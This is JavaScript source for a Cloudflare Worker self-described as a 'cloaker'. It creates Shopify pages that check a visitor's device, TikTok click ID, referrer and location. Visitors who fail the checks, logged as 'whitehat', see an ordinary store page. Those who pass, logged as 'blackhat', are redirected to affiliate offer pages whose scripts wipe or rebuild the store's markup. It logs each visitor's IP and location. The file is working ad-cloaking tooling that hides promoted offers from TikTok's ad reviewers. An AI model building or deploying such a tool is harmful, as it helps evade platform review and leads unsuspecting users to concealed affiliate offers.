/**
 * Standalone Cloaker Worker
 * Handles all cloaking functionality independently from the main application
 */

// Configuration
// Configuration - this should be updated when deploying
const CONFIG = {
  MAIN_APP_URL: 'https://cranads.com',
  LOG_ENDPOINT: 'https://cranads.com/api/logs/public',
  CAMPAIGN_WORKER_URL: 'https://cloaker.millianfreakyads.workers.dev' // This should be the cloaker's own URL
};

/**
 * Generate page content for TikTok validation page
 */
function generatePageContent(campaign, campaignId, launchNumber) {
  const loadingScreenHTML = `
<div id="loading-container" style="
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100vh;
  background: #f5f5f5;
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 9999;
">
  <div style="text-align: center;">
    <div class="spinner" style="
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-left-color: #000;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    "></div>
    <p style="
      color: #666;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
      font-size: 16px;
      margin: 0;
    ">Loading...</p>
  </div>
</div>

<style>
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  
  .shopify-section, header, footer, .header, .footer {
    display: none !important;
  }
  
  body {
    margin: 0;
    padding: 0;
    overflow: hidden;
  }
</style>
`;

  const trackingScript = `
<script>
(function() {
  // Extract campaign info from URL
  const pathMatch = window.location.pathname.match(/\\/pages\\/cloak-([^-]+)-(\\d+)/);
  if (!pathMatch) {
    console.error('Invalid page URL format');
    return;
  }
  
  const campaignId = pathMatch[1];
  const launchNumber = pathMatch[2];
  
  // Get URL parameters
  const urlParams = new URLSearchParams(window.location.search);
  const ttclid = urlParams.get('ttclid');
  const testMode = urlParams.get('test') === 'true';
  
  // Store server-provided data
  let serverData = null;
  
  // Validation checks
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  const hasTtclid = ttclid && ttclid.length > 0;
  
  // Check referrer
  let isTikTokReferrer = false;
  if (testMode) {
    isTikTokReferrer = true;
    console.log('TEST MODE: Skipping referrer check');
  } else {
    isTikTokReferrer = document.referrer.includes('tiktok.com') || 
                       document.referrer === '' || 
                       document.referrer.includes('tiktokv.com') ||
                       document.referrer.includes('tiktokcdn.com');
  }
  
  console.log('Validation results:', { 
    isMobile, 
    hasTtclid, 
    isTikTokReferrer,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    testMode 
  });
  
  // First, fetch campaign data to get server information
  fetch('${CONFIG.CAMPAIGN_WORKER_URL}/api/campaigns/client/' + campaignId + '/' + launchNumber)
    .then(function(response) { 
      return response.json(); 
    })
    .then(function(data) {
      // Store the server data
      serverData = data;
      
      // Check validations
      if (!isMobile || !hasTtclid || !isTikTokReferrer) {
        console.log('Validation failed, staying on page');
        
        // Log failed validation
        const failureReason = !isMobile ? 'not_mobile' : !hasTtclid ? 'no_ttclid' : 'invalid_referrer';
        
        // Send log for failed validation
        const logData = {
          campaignId: campaignId,
          launchNumber: launchNumber,
          type: 'validation',
          decision: 'whitehat',
          ip: serverData.clientIP || 'unknown',
          country: serverData.geoData?.country || 'unknown',
          region: serverData.geoData?.region || null,
          city: serverData.geoData?.city || null,
          timezone: serverData.geoData?.timezone || null,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          referer: document.referrer,
          url: window.location.href,
          params: {
            ttclid: ttclid,
            test: testMode,
            failureReason: failureReason
          }
        };
        
        // Send log to server
        console.log('Sending whitehat log:', logData);
        fetch('${CONFIG.LOG_ENDPOINT}', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(logData),
          keepalive: true
        })
        .then(function(response) {
          console.log('Log response status:', response.status);
          return response.text();
        })
        .then(function(text) {
          console.log('Log response body:', text);
          try {
            const data = JSON.parse(text);
            console.log('Log saved with ID:', data.id);
          } catch (e) {
            console.log('Response was not JSON:', text);
          }
        })
        .catch(function(err) {
          console.error('Failed to send log:', err);
        });
        
        // Show default content
        document.getElementById('loading-container').style.display = 'none';
        document.querySelectorAll('.shopify-section, header, footer, .header, .footer').forEach(function(el) {
          el.style.display = '';
        });
        document.body.style.overflow = '';
        return;
      }
      
      // Validation passed, continue with redirect
      console.log('All validations passed, processing redirect...');
      
      if (data.error) {
        console.error('Failed to fetch campaign data:', data.error);
        document.getElementById('loading-container').style.display = 'none';
        return;
      }
      
      // Get GEO data from server response
      const geoData = data.geoData || {};
      const country = geoData.country || 'US';
      const os = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'ios' : 'android';
      
      console.log('Server-detected GEO:', {
        country: country,
        region: geoData.region,
        city: geoData.city,
        timezone: geoData.timezone,
        continent: geoData.continent
      });
      
      let redirectUrl;
      
      // Check redirect type
      if (data.redirectType === 'custom' && data.customRedirectLink) {
        // Custom redirect
        try {
          redirectUrl = new URL(data.customRedirectLink);
          console.log('Using custom redirect');
        } catch (e) {
          console.error('Invalid custom redirect URL:', data.customRedirectLink);
          return;
        }
      } else if (data.redirectStoreDomain) {
        // Template/Shopify redirect
        const redirectPageHandle = 'offer-' + campaignId + '-' + launchNumber;
        redirectUrl = new URL('https://' + data.redirectStoreDomain + '/pages/' + redirectPageHandle);
        console.log('Redirecting to offer page on redirect store:', data.redirectStoreDomain);
      } else {
        console.error('No redirect store domain found');
        document.getElementById('loading-container').style.display = 'none';
        return;
      }
      
      // Add tracking parameters
      redirectUrl.searchParams.set('s1', campaignId);
      redirectUrl.searchParams.set('s2', launchNumber);
      
      // Pass ttclid
      if (ttclid) {
        redirectUrl.searchParams.set('ttclid', ttclid);
      }
      
      // For template redirects, pass additional data
      if (data.redirectType !== 'custom') {
        redirectUrl.searchParams.set('os', os);
        redirectUrl.searchParams.set('geo', country);
        
        if (geoData.region) {
          redirectUrl.searchParams.set('region', geoData.region);
        }
        if (geoData.city) {
          redirectUrl.searchParams.set('city', geoData.city);
        }
        if (geoData.timezone) {
          redirectUrl.searchParams.set('tz', encodeURIComponent(geoData.timezone));
        }
      }
      
      console.log('Redirecting to:', redirectUrl.href);
      
      // Log successful click before redirect
      const successLogData = {
        campaignId: campaignId,
        launchNumber: launchNumber,
        type: 'click',
        decision: 'blackhat',
        ip: serverData.clientIP || 'unknown',
        country: country || 'unknown',
        region: geoData.region || null,
        city: geoData.city || null,
        timezone: geoData.timezone || null,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        referer: document.referrer,
        url: window.location.href,
        redirectUrl: redirectUrl.href,
        os: os,
        params: {
          ttclid: ttclid,
          test: testMode,
          redirectType: data.redirectType
        }
      };
      
      // Function to perform the redirect
      function performRedirect() {
        console.log('Performing redirect to:', redirectUrl.href);
        window.location.href = redirectUrl.href;
      }
      
      // Log and redirect
      console.log('Sending blackhat click log:', successLogData);
      fetch('${CONFIG.LOG_ENDPOINT}', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(successLogData),
        keepalive: true
      })
      .then(function(response) {
        console.log('Click log response status:', response.status);
        return response.text();
      })
      .then(function(text) {
        console.log('Click log response body:', text);
        try {
          const data = JSON.parse(text);
          console.log('Click log saved with ID:', data.id);
        } catch (e) {
          console.log('Response was not JSON:', text);
        }
        performRedirect();
      })
      .catch(function(err) {
        console.error('Failed to log click:', err);
        performRedirect();
      });
    })
    .catch(function(error) {
      console.error('Redirect error:', error);
      document.getElementById('loading-container').style.display = 'none';
    });
})();
</script>
`;

  return loadingScreenHTML + trackingScript;
}

/**
 * Generate affiliate links replacement script
 */
function generateAffiliateLinksScript(affiliateLinks) {
  return `
<script>
(function() {
  // Get URL parameters
  const urlParams = new URLSearchParams(window.location.search);
  const os = urlParams.get('os') || 'unknown';
  const geo = urlParams.get('geo') || 'US';
  const region = urlParams.get('region');
  const city = urlParams.get('city');
  const timezone = urlParams.get('tz');
  const s1 = urlParams.get('s1'); // campaign ID
  const s2 = urlParams.get('s2'); // launch number
  const ttclid = urlParams.get('ttclid'); // TikTok Click ID - this is s3
  
  console.log('Offer page - Location data:', { 
    geo: geo, 
    region: region,
    city: city,
    timezone: timezone ? decodeURIComponent(timezone) : 'not provided',
    os: os, 
    s1: s1, 
    s2: s2, 
    ttclid: ttclid
  });
  
  console.log('Available affiliate links:', Object.keys(affiliateLinks));
  
  // Affiliate links data
  const affiliateLinks = ${JSON.stringify(affiliateLinks)};
  
  // Select the best matching affiliate link
  let affiliateLink = selectAffiliateLink(affiliateLinks, geo, os);
  
  console.log('Selected affiliate link:', affiliateLink);
  console.log('Selection logic used:', getSelectionLogic(affiliateLinks, geo, os));
  
  if (affiliateLink) {
    try {
      // Build the final URL with only s1, s2, and s3 (ttclid)
      const finalUrl = buildFinalAffiliateUrl(affiliateLink, { 
        s1, 
        s2, 
        s3: ttclid
      });
      console.log('Final affiliate URL:', finalUrl);
      
      // Replace all {{AFFILIATE_LINK}} placeholders
      replaceAffiliateLinkPlaceholders(finalUrl);
      
      // Track the redirect for analytics
      trackRedirect(geo, os, region, city);
      
    } catch (error) {
      console.error('Error processing affiliate link:', error);
    }
  } else {
    console.error('No affiliate link found for geo:', geo, 'os:', os);
    // Fallback to first available link
    const fallbackLink = Object.values(affiliateLinks)[0];
    if (fallbackLink) {
      console.warn('Using fallback link:', fallbackLink);
      const finalUrl = buildFinalAffiliateUrl(fallbackLink, { 
        s1, 
        s2, 
        s3: ttclid
      });
      replaceAffiliateLinkPlaceholders(finalUrl);
    }
  }
  
  // Helper function to explain selection logic
  function getSelectionLogic(links, geo, os) {
    if (links[geo + '_' + os]) return 'Exact match: ' + geo + '_' + os;
    if (links[geo]) return 'Country match: ' + geo;
    if (links['US']) return 'Default US fallback';
    return 'First available link';
  }
  
  // Helper function to select the best matching affiliate link
  function selectAffiliateLink(links, geo, os) {
    // Log the selection process for debugging
    console.log('Selecting affiliate link for:', { geo, os });
    console.log('Checking for:', geo + '_' + os);
    
    // Try exact match first (e.g., US_ios)
    if (links[geo + '_' + os]) {
      console.log('Found exact match:', geo + '_' + os);
      return links[geo + '_' + os];
    }
    
    // Try country-only match (e.g., US)
    if (links[geo]) {
      console.log('Found country match:', geo);
      return links[geo];
    }
    
    // Try US as default fallback
    if (links['US']) {
      console.log('Using US fallback');
      return links['US'];
    }
    
    // Last resort - first available link
    const firstLink = Object.values(links)[0];
    if (firstLink) {
      console.log('Using first available link');
      return firstLink;
    }
    
    console.error('No affiliate links available!');
    return null;
  }
  
  // Simplified: Only add s1, s2, and s3 parameters
  function buildFinalAffiliateUrl(baseUrl, params) {
    try {
      const url = new URL(baseUrl);
      
      // Add only the essential tracking parameters
      if (params.s1) url.searchParams.set('s1', params.s1); // Campaign ID
      if (params.s2) url.searchParams.set('s2', params.s2); // Launch Number
      if (params.s3) url.searchParams.set('s3', params.s3); // ttclid
      
      // Optionally add geo for affiliate's reference (not as s-parameter)
      url.searchParams.set('geo', geo);
      if (region) url.searchParams.set('region', region);

      return url.href;
    } catch (error) {
      console.error('Error building affiliate URL:', error, 'Base URL:', baseUrl);
      return baseUrl; // Return original URL if parsing fails
    }
  }
  
  // Helper function to replace all affiliate link placeholders
  function replaceAffiliateLinkPlaceholders(finalUrl) {
    // Replace in text content
    document.body.innerHTML = document.body.innerHTML.replace(/{{AFFILIATE_LINK}}/g, finalUrl);
    
    // Update direct links
    document.querySelectorAll('a.affiliate-link, a[href*="{{AFFILIATE_LINK}}"]').forEach(link => {
      link.href = finalUrl;
    });
    
    // Update buttons with onclick events
    document.querySelectorAll('button[onclick*="{{AFFILIATE_LINK}}"]').forEach(button => {
      button.onclick = function() { 
        window.location.href = finalUrl; 
      };
    });
    
    // Update any data attributes
    document.querySelectorAll('[data-href*="{{AFFILIATE_LINK}}"]').forEach(element => {
      element.dataset.href = finalUrl;
    });
  }
  
  // Track redirect for analytics (internal use only)
  function trackRedirect(geo, os, region, city) {
    console.log('Redirect tracked:', {
      timestamp: new Date().toISOString(),
      geo: geo,
      os: os,
      region: region,
      city: city,
      campaign: s1,
      launch: s2,
      ttclid: ttclid
    });
  }
  
  // Make functions available globally for the nuclear option
  window.selectAffiliateLink = selectAffiliateLink;
  window.buildFinalAffiliateUrl = buildFinalAffiliateUrl;
  window.replaceAffiliateLinkPlaceholders = replaceAffiliateLinkPlaceholders;
  window.affiliateLinks = affiliateLinks;
})();
</script>`;
}

/**
 * Generate CSS to hide Shopify UI elements
 */
function generateHideShopifyElementsCSS() {
  return `
<!-- Initial hide everything -->
<style id="initial-hide">
  html { visibility: hidden !important; }
</style>

<script>
(function() {
  'use strict';
  
  // Function to completely replace page content
  function nukeAndRebuild() {
    console.log('Nuclear option: Replacing entire page content');
    
    // Get the offer content
    const offerContent = document.getElementById('offer-content');
    if (!offerContent) {
      console.error('Offer content not found!');
      return;
    }
    
    // Clone the offer content to preserve it
    const offerClone = offerContent.cloneNode(true);
    
    // Get the affiliate script if it exists
    const affiliateScripts = [];
    document.querySelectorAll('script').forEach(script => {
      if (script.textContent.includes('affiliateLinks') || 
          script.textContent.includes('AFFILIATE_LINK') ||
          script.textContent.includes('selectAffiliateLink')) {
        affiliateScripts.push(script.cloneNode(true));
      }
    });
    
    // Save the current page title
    const pageTitle = document.title;
    
    // Complete nuclear option - rebuild the entire document
    document.documentElement.innerHTML = \`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>\${pageTitle}</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    html, body {
      width: 100%;
      height: 100%;
      overflow-x: hidden;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      line-height: 1.6;
      color: #333;
      background: #fff;
    }
    
    #offer-content {
      width: 100%;
      min-height: 100vh;
      display: block;
    }
    
    /* Ensure images are responsive */
    #offer-content img {
      max-width: 100%;
      height: auto;
    }
    
    /* Basic responsive container */
    .container {
      width: 100%;
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }
  </style>
</head>
<body>
  <div id="offer-wrapper"></div>
</body>
</html>
\`;
    
    // Wait for the new document to be ready
    setTimeout(() => {
      // Get the new wrapper
      const wrapper = document.getElementById('offer-wrapper');
      if (wrapper) {
        // Append the cloned offer content
        wrapper.appendChild(offerClone);
        
        // Re-add affiliate scripts
        affiliateScripts.forEach(script => {
          document.body.appendChild(script);
        });
        
        // Re-run affiliate link replacement
        if (window.selectAffiliateLink && window.buildFinalAffiliateUrl && window.replaceAffiliateLinkPlaceholders) {
          // Get URL parameters again
          const urlParams = new URLSearchParams(window.location.search);
          const os = urlParams.get('os') || 'unknown';
          const geo = urlParams.get('geo') || 'US';
          const s1 = urlParams.get('s1');
          const s2 = urlParams.get('s2');
          const ttclid = urlParams.get('ttclid');
          
          // Re-run the affiliate link logic
          if (window.affiliateLinks) {
            const affiliateLink = window.selectAffiliateLink(window.affiliateLinks, geo, os);
            if (affiliateLink) {
              const finalUrl = window.buildFinalAffiliateUrl(affiliateLink, { s1, s2, s3: ttclid });
              window.replaceAffiliateLinkPlaceholders(finalUrl);
            }
          }
        }
        
        // Make the page visible
        document.documentElement.style.visibility = 'visible';
      }
    }, 10);
  }
  
  // Alternative approach - less nuclear but still aggressive
  function aggressiveHide() {
    console.log('Aggressive hide: Clearing all except offer content');
    
    // Get offer content
    const offerContent = document.getElementById('offer-content');
    if (!offerContent) {
      console.error('Offer content not found!');
      return;
    }
    
    // Clone it
    const offerClone = offerContent.cloneNode(true);
    
    // Clear the body
    document.body.innerHTML = '';
    
    // Add back the offer content
    document.body.appendChild(offerClone);
    
    // Re-run any scripts that were in the offer content
    const scripts = offerClone.getElementsByTagName('script');
    Array.from(scripts).forEach(oldScript => {
      const newScript = document.createElement('script');
      newScript.textContent = oldScript.textContent;
      oldScript.parentNode.replaceChild(newScript, oldScript);
    });
    
    // Apply clean styles
    const cleanStyles = document.createElement('style');
    cleanStyles.textContent = \`
      body {
        margin: 0 !important;
        padding: 0 !important;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      }
      
      #offer-content {
        width: 100%;
        min-height: 100vh;
      }
      
      /* Remove any Shopify-injected styles */
      body::before,
      body::after {
        display: none !important;
      }
    \`;
    document.head.appendChild(cleanStyles);
    
    // Show the page
    document.documentElement.style.visibility = 'visible';
  }
  
  // Decide which approach to use based on the page structure
  function initializeNuclearOption() {
    // Wait a bit for the page to load
    setTimeout(() => {
      const offerContent = document.getElementById('offer-content');
      
      if (!offerContent) {
        console.error('Cannot find offer content - aborting nuclear option');
        document.documentElement.style.visibility = 'visible';
        return;
      }
      
      // Check if there are many Shopify elements
      const shopifyElements = document.querySelectorAll(
        '.shopify-section, .header, .footer, .announcement-bar, [id*="shopify-section"]'
      );
      
      if (shopifyElements.length > 5) {
        // Too many Shopify elements - use nuclear option
        nukeAndRebuild();
      } else {
        // Fewer elements - use aggressive hide
        aggressiveHide();
      }
    }, 100);
  }
  
  // Start the process
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeNuclearOption);
  } else {
    initializeNuclearOption();
  }
})();
</script>`;
}

/**
 * Build offer page content with template and scripts
 */
function buildOfferPageContent({ templateHTML, campaign, campaignId, launchNumber }) {
  const affiliateLinksScript = generateAffiliateLinksScript(campaign.affiliateLinks || {});
  const hideShopifyElementsCSS = generateHideShopifyElementsCSS();
  
  return `
${hideShopifyElementsCSS}

<!-- Offer Content Container -->
<div id="offer-content">
${templateHTML}
</div>

<!-- Affiliate Link Replacement Script -->
<script>
// Store affiliate links globally for the nuclear option
window.affiliateLinks = ${JSON.stringify(campaign.affiliateLinks || {})};
</script>
${affiliateLinksScript}
`;
}

/**
 * Create or update TikTok validation page on Shopify
 */
async function createTikTokValidationPage(store, campaign, campaignId, launchNumber, pageHandle) {
  const pageContent = generatePageContent(campaign, campaignId, launchNumber);
  
  const pageData = {
    page: {
      title: `${campaign.name} - Launch ${launchNumber}`,
      handle: pageHandle,
      body_html: pageContent,
      published: true,
      template_suffix: null
    }
  };
  
  // Ensure domain format is correct
  let apiDomain = store.storeUrl.replace(/^https?:\/\//, '');
  if (!apiDomain.includes('.myshopify.com')) {
    apiDomain = `${apiDomain}.myshopify.com`;
  }
  
  // First check if page already exists
  const checkUrl = `https://${apiDomain}/admin/api/2024-01/pages.json?handle=${pageHandle}`;
  console.log('Checking for existing TikTok page:', checkUrl);
  
  const checkResponse = await fetch(checkUrl, {
    headers: {
      'X-Shopify-Access-Token': store.accessToken,
      'Content-Type': 'application/json'
    }
  });
  
  let existingPageId = null;
  if (checkResponse.ok) {
    const data = await checkResponse.json();
    if (data.pages && data.pages.length > 0) {
      existingPageId = data.pages[0].id;
      console.log('Found existing TikTok page with ID:', existingPageId);
    }
  }
  
  if (existingPageId) {
    // Update existing page
    console.log('Updating existing TikTok page:', existingPageId);
    const updateResponse = await fetch(`https://${apiDomain}/admin/api/2024-01/pages/${existingPageId}.json`, {
      method: 'PUT',
      headers: {
        'X-Shopify-Access-Token': store.accessToken,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(pageData)
    });
    
    if (!updateResponse.ok) {
      const errorText = await updateResponse.text();
      throw new Error(`Failed to update TikTok page: ${updateResponse.status} - ${errorText}`);
    }
    
    return await updateResponse.json();
  } else {
    // Create new page
    console.log('Creating new TikTok page');
    const createResponse = await fetch(`https://${apiDomain}/admin/api/2024-01/pages.json`, {
      method: 'POST',
      headers: {
        'X-Shopify-Access-Token': store.accessToken,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(pageData)
    });
    
    if (!createResponse.ok) {
      const errorText = await createResponse.text();
      throw new Error(`Failed to create TikTok page: ${createResponse.status} - ${errorText}`);
    }
    
    return await createResponse.json();
  }
}

/**
 * Create or update redirect store offer page on Shopify
 */
async function createRedirectStoreOfferPage(redirectStore, campaign, campaignId, launchNumber, templateHTML) {
  try {
    // Validate inputs
    if (!campaign) {
      throw new Error('Campaign object is required');
    }
    
    if (!redirectStore) {
      throw new Error('Redirect store is required');
    }
    
    if (!redirectStore.accessToken) {
      throw new Error('Redirect store is missing Admin API token');
    }
    
    console.log(`Creating offer page on redirect store: ${redirectStore.storeName || redirectStore.storeUrl}`);
    
    // Generate page handle for redirect store
    const offerPageHandle = `offer-${campaignId}-${launchNumber}`;
    
    // Build the offer page content with template and hide CSS
    const offerPageContent = buildOfferPageContent({
      templateHTML,
      campaign,
      campaignId,
      launchNumber
    });
    
    // Create page data
    const pageData = {
      page: {
        title: `${campaign.name} - Offer ${launchNumber}`,
        handle: offerPageHandle,
        body_html: offerPageContent,
        published: true,
        template_suffix: null
      }
    };
    
    // Ensure domain format is correct
    let apiDomain = redirectStore.storeUrl.replace(/^https?:\/\//, '');
    if (!apiDomain.includes('.myshopify.com')) {
      apiDomain = `${apiDomain}.myshopify.com`;
    }
    
    // Check if page already exists
    const checkUrl = `https://${apiDomain}/admin/api/2024-01/pages.json?handle=${offerPageHandle}`;
    console.log('Checking for existing redirect page:', checkUrl);
    
    const checkResponse = await fetch(checkUrl, {
      headers: {
        'X-Shopify-Access-Token': redirectStore.accessToken,
        'Content-Type': 'application/json'
      }
    });
    
    let existingPageId = null;
    if (checkResponse.ok) {
      const data = await checkResponse.json();
      if (data.pages && data.pages.length > 0) {
        existingPageId = data.pages[0].id;
        console.log('Found existing redirect page with ID:', existingPageId);
      }
    }
    
    if (existingPageId) {
      // Update existing page
      console.log('Updating existing redirect page:', existingPageId);
      const updateResponse = await fetch(`https://${apiDomain}/admin/api/2024-01/pages/${existingPageId}.json`, {
        method: 'PUT',
        headers: {
          'X-Shopify-Access-Token': redirectStore.accessToken,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(pageData)
      });
      
      if (!updateResponse.ok) {
        const errorText = await updateResponse.text();
        throw new Error(`Failed to update redirect page: ${updateResponse.status} - ${errorText}`);
      }
      
      const result = await updateResponse.json();
      console.log(`Offer page updated successfully: ${offerPageHandle}`);
      return result;
    } else {
      // Create new page
      console.log('Creating new redirect page');
      const createResponse = await fetch(`https://${apiDomain}/admin/api/2024-01/pages.json`, {
        method: 'POST',
        headers: {
          'X-Shopify-Access-Token': redirectStore.accessToken,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(pageData)
      });
      
      if (!createResponse.ok) {
        const errorText = await createResponse.text();
        throw new Error(`Failed to create redirect page: ${createResponse.status} - ${errorText}`);
      }
      
      const result = await createResponse.json();
      console.log(`Offer page created successfully: ${offerPageHandle}`);
      return result;
    }
    
  } catch (error) {
    console.error('Error in createRedirectStoreOfferPage:', error);
    throw error;
  }
}

/**
 * Main handler for the cloaker worker
 */
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;
    
    // CORS headers
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      'Access-Control-Max-Age': '86400'
    };
    
    // Handle OPTIONS requests
    if (request.method === 'OPTIONS') {
      return new Response(null, { 
        status: 204,
        headers: corsHeaders 
      });
    }
    
    try {
      // Route: Generate pages
      if (path === '/generate-pages' && request.method === 'POST') {
        const data = await request.json();
        const { campaign, campaignId, launchNumber, tiktokStore, redirectStore, templateHTML } = data;
        
        // Validate required data
        if (!campaign || !campaignId || launchNumber === undefined || !tiktokStore) {
          return new Response(
            JSON.stringify({ error: 'Missing required data' }),
            { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
          );
        }
        
        try {
          // Generate page handle
          const pageHandle = `cloak-${campaignId}-${launchNumber}`;
          
          // Step 1: Create/update TikTok validation page
          console.log('Creating/updating TikTok validation page...');
          await createTikTokValidationPage(tiktokStore, campaign, campaignId, launchNumber, pageHandle);
          
          // Step 2: Create/update redirect store offer page if not custom redirect
          if (campaign.redirectType !== 'custom' && redirectStore) {
            console.log('Creating/updating redirect store offer page...');
            await createRedirectStoreOfferPage(redirectStore, campaign, campaignId, launchNumber, templateHTML);
          }
          
          // Generate the link
          let storeUrl = tiktokStore.storeUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
          if (!storeUrl.includes('.myshopify.com') && !storeUrl.includes('.')) {
            storeUrl = `${storeUrl}.myshopify.com`;
          }
          const linkUrl = `https://${storeUrl}/pages/${pageHandle}`;
          
          return new Response(
            JSON.stringify({
              success: true,
              link: linkUrl,
              pageHandle: pageHandle
            }),
            { headers: { 'Content-Type': 'application/json', ...corsHeaders } }
          );
          
        } catch (error) {
          console.error('Error generating pages:', error);
          return new Response(
            JSON.stringify({ 
              error: 'Failed to generate pages',
              message: error.message 
            }),
            { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
          );
        }
      }
      
      // Route: Get campaign data for client
      if (path.startsWith('/api/campaigns/client/') && request.method === 'GET') {
        const pathParts = path.split('/').filter(p => p);
        const campaignId = pathParts[3];
        const launchNumber = pathParts[4];
        
        // Forward to main app to get campaign data
        const mainAppUrl = `${CONFIG.MAIN_APP_URL}/api/campaigns/client/${campaignId}/${launchNumber}`;
        const response = await fetch(mainAppUrl, {
          headers: {
            'CF-Connecting-IP': request.headers.get('CF-Connecting-IP'),
            'CF-IPCountry': request.headers.get('CF-IPCountry'),
            'CF-Region': request.headers.get('CF-Region'),
            'CF-City': request.headers.get('CF-City'),
            'CF-Timezone': request.headers.get('CF-Timezone'),
            'CF-Continent': request.headers.get('CF-Continent')
          }
        });
        
        const data = await response.json();
        
        // Add client IP to response
        data.clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
        
        return new Response(
          JSON.stringify(data),
          { 
            status: response.status,
            headers: { 'Content-Type': 'application/json', ...corsHeaders } 
          }
        );
      }
      
      // Route: Forward logs to main app
      if (path === '/log' && request.method === 'POST') {
        const logData = await request.json();
        
        // Forward to main app log endpoint
        const response = await fetch(CONFIG.LOG_ENDPOINT, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(logData)
        });
        
        const result = await response.text();
        
        return new Response(result, {
          status: response.status,
          headers: { 
            'Content-Type': 'application/json',
            ...corsHeaders 
          }
        });
      }
      
      // Test endpoint for geo detection
      if (path === '/test-geo' && request.method === 'GET') {
        const geoData = {
          ip: request.headers.get('CF-Connecting-IP') || 'unknown',
          country: request.headers.get('CF-IPCountry') || 'unknown',
          region: request.headers.get('CF-Region') || null,
          city: request.headers.get('CF-City') || null,
          timezone: request.headers.get('CF-Timezone') || null,
          continent: request.headers.get('CF-Continent') || null,
          latitude: request.headers.get('CF-Latitude') || null,
          longitude: request.headers.get('CF-Longitude') || null,
          postalCode: request.headers.get('CF-PostalCode') || null,
          metroCode: request.headers.get('CF-MetroCode') || null,
          headers: Object.fromEntries(request.headers.entries())
        };
        
        return new Response(
          JSON.stringify({
            message: 'Geo detection test',
            geoData: geoData,
            userAgent: request.headers.get('User-Agent')
          }),
          { 
            headers: { 'Content-Type': 'application/json', ...corsHeaders } 
          }
        );
      }
      
      // Default response
      return new Response(
        JSON.stringify({ 
          error: 'Not found',
          message: 'Cloaker Worker API - Available endpoints: POST /generate-pages, GET /api/campaigns/client/:id/:launch, POST /log, GET /test-geo'
        }),
        { 
          status: 404, 
          headers: { 'Content-Type': 'application/json', ...corsHeaders } 
        }
      );
      
    } catch (error) {
      console.error('Cloaker worker error:', error);
      return new Response(
        JSON.stringify({ 
          error: 'Internal server error',
          message: error.message 
        }),
        { 
          status: 500, 
          headers: { 'Content-Type': 'application/json', ...corsHeaders } 
        }
      );
    }
  }
};